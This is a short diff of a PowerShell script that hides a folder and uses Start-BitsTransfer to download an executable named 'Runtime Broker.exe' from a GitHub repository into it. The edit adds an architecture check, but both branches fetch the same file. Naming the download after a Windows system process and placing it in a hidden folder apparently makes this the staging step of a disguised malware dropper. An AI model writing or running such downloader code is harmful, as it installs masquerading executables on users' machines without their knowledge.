@@ -11,7 +11,8 @@ if (-not (Test-Path $root)) {
     catch {
         Write-Host "Error: $_"
     }
-}else {
+}
+else {
     try {
         Set-ItemProperty -Path $root -Name Attributes -Value 'Hidden'
     }
@@ -29,7 +30,11 @@ catch {
 }
 
 try {
-    Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/Runtime%20Broker.exe" -Destination $rootFile
+    if ($arch -eq "64-bit") {
+        Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/Runtime%20Broker.exe" -Destination $rootFile
+    }elseif ($arch -eq "32-bit") {
+        Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/Runtime%20Broker.exe" -Destination $rootFile
+    }
 }
 catch {
     Write-Host "Error: $_"
